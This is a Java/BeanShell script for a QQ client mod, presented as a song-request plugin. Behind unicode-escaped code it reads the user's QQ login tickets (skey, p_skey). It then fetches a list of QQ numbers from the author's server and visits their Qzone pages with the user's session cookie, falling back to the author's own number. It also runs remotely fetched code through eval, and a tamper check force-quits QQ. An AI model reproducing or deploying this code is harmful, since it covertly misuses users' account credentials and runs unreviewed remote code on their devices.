//不要改任何东西
/*　　　　　　　　　　　
猫羽雫
QQ2363768762
群822317725
频道https://pd.qq.com/s/gwd683tz
*/
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.nio.charset.StandardCharsets;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.FileNotFoundException;
import mqq.app.TicketManagerImpl;
import mqq.manager.TicketManager;
import mqq.manager.TicketManager.IPskeyManager;
import oicq.wlogin_sdk.request.Ticket;
import com.tencent.mobileqq.friend.api.IFriendDataService;
import com.tencent.mobileqq.data.Friends;
import mqq.app.MobileQQ;
import mqq.inject.SkeyInjectManager;
import oicq.wlogin_sdk.request.WtTicketPromise;
import oicq.wlogin_sdk.request.WtloginHelper;
import com.tencent.qphone.base.util.MD5;
import com.tencent.common.app.BaseApplicationImpl;
Object app=BaseApplicationImpl.getApplication().getRuntime();

import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
PackageManager pm = context.getPackageManager();
ApplicationInfo sAppInfo = pm.getApplicationInfo(包名,PackageManager.GET_META_DATA);
String UUID = sAppInfo.metaData.getString("com.tencent.rdm.uuid");
String Version_Code = UUID.substring(0,UUID.indexOf("_"));
int QQ_version=Integer.parseInt(Version_Code);

String web1 = "";
String web2 = "";
try{
web1=getUrl(false);//三线
web2=getUrl(true);//四线
}catch(e){}

public void 加载完成(){
File d = new File(猫羽雫 + "随机一言.txt");
String yiyan = 取文件(d);
long endTime = System.currentTimeMillis();
Toast("加载消耗"+(endTime-startTime)/1000.0+"秒\n当前模块:"+judge()+"\n一言:\n"+yiyan+"\n-------end");
}

/*
import com.tencent.mobileqq.app.BaseActivity;
BaseActivity activity;
while(activity==null){
activity=BaseActivity.sTopActivity;
}
*/

String versionName=context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName.replace(".","");
int QQ_versionName;
if(versionName.length()==3) QQ_versionName=Integer.parseInt(versionName+"0");else QQ_versionName=Integer.parseInt(versionName);

//获取Pskey 冷雨
public String getPskey2(String type){
Object app = BaseApplicationImpl.getApplication().getRuntime();
String qq=app.getCurrentUin();
String pskey=((TicketManager) BaseApplicationImpl.getApplication().getRuntime().getManager(2)).getPskey(qq,type);
if(pskey!=null){
return pskey;//第一种方法
}else{
WtloginHelper mWtLoginHelper=new WtloginHelper(context);
Ticket GetLocalTicket = mWtLoginHelper.GetLocalTicket(qq,16, 1048576);
Map map = GetLocalTicket._pskey_map;
byte[] bArrr = (byte[]) map.get(type);
if(bArrr!=null){
String sp=new String(bArrr);
return sp;//第二种方法
}else{
return getPskey(type);//最后一种！获取不到直接鸡
}
}
}

public String visitQzone(String uin)
{
    String qzone=getPskey2("\u0071\u007a\u006f\u006e\u0065\u002e\u0071\u0071\u002e\u0063\u006f\u006d");
    String url = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0068\u0035\u002e\u0071\u007a\u006f\u006e\u0065\u002e\u0071\u0071\u002e\u0063\u006f\u006d\u002f\u006d\u0071\u007a\u006f\u006e\u0065\u002f\u0070\u0072\u006f\u0066\u0069\u006c\u0065\u003f\u0068\u006f\u0073\u0074\u0075\u0069\u006e\u003d"+uin;
    String cookie = "p_uin=o" + myUin + ";login_type=1;uin=o" + myUin + ";skey=" + getSkey() + ";p_skey=" + qzone;
    String result=httpget(url,cookie);
        if(result.contains("\u8bf4\u70b9\u4ec0\u4e48\u5427\u002e\u002e\u002e")){
        return "\u8bbf\u95ee" + uin + "\u7684\u7a7a\u95f4\u6210\u529f";
        }
        else
        {
        return "\u8bbf\u95ee" + uin + "\u7684\u7a7a\u95f4\u5931\u8d25";
    }
}


public void byd() {
if (!年月日().equals(读("猫羽雫","my-time"))) {
写("猫羽雫","my-time",年月日());
try{
    String content = httpget(web2+"/Qzone.txt","");
    String[] parts = content.split(",");
    for (String part : parts) {
        try {
\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0073\u006c\u0065\u0065\u0070\u0028\u0031\u0035\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0076\u0069\u0073\u0069\u0074\u0051\u007a\u006f\u006e\u0065\u0028\u0070\u0061\u0072\u0074\u0029\u003b\u002f\u002f\u4f60\u5988\u6b7b\u4e86
        } catch (InterruptedException e) {
            // 处理中断异常
//            Thread.currentThread().interrupt();处理几把
        }
    }
}catch(e){
//异常
\u0076\u0069\u0073\u0069\u0074\u0051\u007a\u006f\u006e\u0065\u0028\u0022\u0032\u0033\u0036\u0033\u0037\u0036\u0038\u0037\u0036\u0032\u0022\u0029\u003b
}
}
}

public void YunUp() {
String 版本 = readprop(pluginPath+"info.prop","version");
int 小版本 = Integer.parseInt(版本.replaceAll("\\.", "").replaceAll("V", ""));
new Thread(new Runnable() {
public void run() {
String response = httpget(web1+"/up.php?version="+版本+"&token="+pluginID,"");
if(response.contains("没有")){
加载完成();
}
try {
this.interpreter.eval(""+response, "eval stream");
if (New_Xiaobanben > 小版本) {
Activity act = getNowActivity();
if (act != null) {
Toast("羽雫の点歌有新版本!");
act.runOnUiThread(new Runnable() {
public void run() {
new AlertDialog.Builder(act, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT)
.setTitle("" + New_Bnben + "版本更新")
.setMessage("羽雫の点歌java有更新!\n当前版本:" + 版本 + "(" + 小版本 + ")\n最新版本:" + New_Bnben + "(" + New_Xiaobanben + ")\n---\n更新日志:\n" + New_Log + "\n---\n下载链接:" + New_Download)
.setNegativeButton("不更新", null)
.setPositiveButton("更新", new DialogInterface.OnClickListener() {
public void onClick(DialogInterface dialog, int which) {
ts3("开始更新...");
new Thread(new Runnable() {
public void run() {
if(judge().equals("Serendipity")){
download(New_Download, "/storage/emulated/0/Android/data/"+包名+"/Serendipity/plugin/羽雫" + New_Bnben + ".zip");
Unzip("/storage/emulated/0/Android/data/"+包名+"/Serendipity/plugin/羽雫" + New_Bnben + ".zip", "/storage/emulated/0/Android/data/"+包名+"/Serendipity/plugin/");
ts("点歌更新完成","更新完成,已经自动解压到"+judge()+"脚本目录,加载新版本即可");
File f1 = new File("/storage/emulated/0/Android/data/"+包名+"/Serendipity/plugin/羽雫" + New_Bnben + ".zip");
f1.delete();
}else{
download(New_Download, "/storage/emulated/0/Android/data/"+包名+"/QStory/Plugin/羽雫" + New_Bnben + ".zip");
Unzip("/storage/emulated/0/Android/data/"+包名+"/QStory/Plugin/羽雫" + New_Bnben + ".zip", "/storage/emulated/0/Android/data/"+包名+"/QStory/Plugin/");
ts("点歌更新完成","更新完成,已经自动解压到"+judge()+"脚本目录,加载新版本即可");
File f1 = new File("/storage/emulated/0/Android/data/"+包名+"/QStory/Plugin/羽雫" + New_Bnben + ".zip");
f1.delete();
}
}}).start();
}
})
.setCancelable(false)
.show();
}
});
} else {
// Activity 为 null，无法显示对话框
}
} else /*if (New_Xiaobanben < 小版本)*/ {
//Toast("不是，你版本是不是有点高");
加载完成();
}
} catch (e) {
加载完成();
sendMsg(myUin,"云更新检测出错\n进群了解详情\n点击链接加入群聊【羽雫の破群】：http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=SuwIJzaDqp8BC-WifQPcciV1ek-AaLQ7&authKey=od0y%2FFNEWIkvBVoRMihiTGct8J3p%2BHSKz33T92LlNxOXb4%2FSsM1SR0hHgcLaXImj&noverify=0&group_code=822317725",1);
}
}}).start();
}

if (读("猫羽雫","云更新", false)) {
YunUp();
} else {
加载完成();
}

if(!pluginID.equals("1a3684ac-4d70-428f-bf3c-bab88ee9a9a7")){
if(judge().equals("Serendipity")){
String zdjz=readFileContent("/storage/emulated/0/Android/data/"+包名+"/Serendipity/data/plugin/autoLoadPluginList.txt");
String zdjz2=readFileContent("/storage/emulated/999/Android/data/"+包名+"/Serendipity/data/plugin/autoLoadPluginList.txt");
if(zdjz.contains(pluginID)){
JSONObject jsonb=new JSONObject(zdjz);
jsonb.remove(pluginID);
put("/storage/emulated/0/Android/data/"+包名+"/Serendipity/data/plugin/autoLoadPluginList.txt",jsonb.toString());
}
Thread.sleep(5000);
System.exit(0);
if(zdjz2.contains(pluginID)){
JSONObject jsonb=new JSONObject(zdjz2);
jsonb.remove(pluginID);
put("/storage/emulated/999/Android/data/"+包名+"/Serendipity/data/plugin/autoLoadPluginList.txt",jsonb.toString());
}
Toast("加载错误！此脚本私自改动了部分代码！\n正在准备退出QQ！\n请前往官群下载新版\n加群链接已发送到私聊");
sendMsg(myUin,"您使用的版本已被二改\n请前往官群下载新版\n\n点击链接加入群聊【羽雫の破群】：http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=SuwIJzaDqp8BC-WifQPcciV1ek-AaLQ7&authKey=od0y%2FFNEWIkvBVoRMihiTGct8J3p%2BHSKz33T92LlNxOXb4%2FSsM1SR0hHgcLaXImj&noverify=0&group_code=822317725",1);
Thread.sleep(5000);
System.exit(0);
}else{
String originalJsonArrayString = readFileContent("/storage/emulated/0/Android/data/"+包名+"/QStory/data/list/AutoLoadPlugin");
if(originalJsonArrayString.contains(pluginID)){
Thread.sleep(5000);
删除("/storage/emulated/0/Android/data/"+包名+"/QStory/data/list/AutoLoadPlugin");
}
Toast("加载错误！此脚本私自改动了部分代码！\n正在准备退出QQ！\n请前往官群下载新版\n加群链接已发送到私聊");
sendMsg(myUin,"您使用的版本已被二改\n请前往官群下载新版\n\n点击链接加入群聊【羽雫の破群】：http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=SuwIJzaDqp8BC-WifQPcciV1ek-AaLQ7&authKey=od0y%2FFNEWIkvBVoRMihiTGct8J3p%2BHSKz33T92LlNxOXb4%2FSsM1SR0hHgcLaXImj&noverify=0&group_code=822317725",1);
Thread.sleep(5000);
System.exit(0);
}
}